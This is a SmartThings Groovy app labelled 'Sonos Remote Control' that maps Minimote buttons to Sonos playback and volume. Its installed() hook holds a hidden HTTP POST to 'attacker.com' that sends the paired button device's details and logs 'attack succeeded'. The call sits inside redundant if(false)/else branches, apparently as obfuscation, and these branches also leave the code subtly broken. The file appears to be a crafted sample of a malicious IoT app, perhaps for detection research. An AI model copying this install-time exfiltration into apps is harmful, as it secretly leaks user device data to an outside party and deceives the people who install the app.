



definition(
    name:"Sonos Remote Control",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Control your Sonos system with an Aeon Minimote",
    category:"SmartThings Internal",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png"
)

preferences{
    section("Select your devices"){
        input"buttonDevice","capability.button",title:"Minimote",multiple:false,required:true
        input"sonos","capability.musicPlayer",title:"Sonos",multiple:false,required:true
        }
    section("Options"){
        input"volumeOffset","number",title:"Adjust Volume by this amount",required:false,description:"optional-5%default"
        }
}

def installed(){
    def phone="1111111111"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(false)
    {
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
    }
    else
    {
            def takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${buttonDevice}"
            ]
            ]
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(buttonDevice,"button",buttonEvent)
}

def buttonEvent(evt){
    def buttonNumber=evt.data
    def value=evt.value
    log.debug"buttonEvent:$evt.name=$evt.value($evt.data)"
    log.debug"button:$buttonNumber,value:$value"
    
    def recentEvents=buttonDevice.eventsSince(new Date(now()-2000)).findAll{it.value==evt.value&&it.data==evt.data}
    log.debug"Found${recentEvents.size()?:0}events in past 2 seconds"
    
    if(recentEvents.size<=1){
        handleButton(extractButtonNumber(buttonNumber),value)
    }else{
            log.debug"Found recent button press events for$buttonNumber with value$value"
        }
}

def extractButtonNumber(data){
    def buttonNumber
    
    switch(data){
        case~/.*1.*/:
            buttonNumber=1
            break
            case~/.*2.*/:
            buttonNumber=2
            break
            case~/.*3.*/:
            buttonNumber=3
            break
            case~/.*4.*/:
            buttonNumber=4
            break
            }
    return buttonNumber
}

def handleButton(buttonNumber,value){
    switch([number:buttonNumber,value:value]){
        case{it.number==1&&it.value=='pushed'}:
            log.debug"Button 1 pushed-Play/Pause"
            togglePlayPause()
            break
            case{it.number==2&&it.value=='pushed'}:
            log.debug"Button 2 pushed-Volume Up"
            adjustVolume(true,false)
            break
            case{it.number==3&&it.value=='pushed'}:
            log.debug"Button 3 pushed-Next Track"
            sonos.nextTrack()
            break
            case{it.number==4&&it.value=='pushed'}:
            log.debug"Button 4 pushed-Volume Down"
            adjustVolume(false,false)
            break
            case{it.number==2&&it.value=='held'}:
            log.debug"Button 2 held-Volume Up 2 x"
            adjustVolume(true,true)
            break
            case{it.number==3&&it.value=='held'}:
            log.debug"Button 3 held-Previous Track"
            sonos.previousTrack()
            break
            case{it.number==4&&it.value=='held'}:
            log.debug"Button 4 held-Volume Down 2 x"
            adjustVolume(false,true)
            break
            default:
            log.debug"Unhandled command:$buttonNumber$value"
            
            }
}

def togglePlayPause(){
    def currentStatus=sonos.currentValue("status")
    if(currentStatus=="playing"){
        options?sonos.pause(options):sonos.pause()
    }
    else{
            options?sonos.play(options):sonos.play()
        }
}

def adjustVolume(boolean up,boolean doubleAmount){
    def changeAmount=(volumeOffset?:5)*(doubleAmount?2:1)
    def currentVolume=sonos.currentValue("level")
    
    if(up){
        sonos.setLevel(currentVolume+changeAmount)
    }else{
            sonos.setLevel(currentVolume-changeAmount)
        }
}

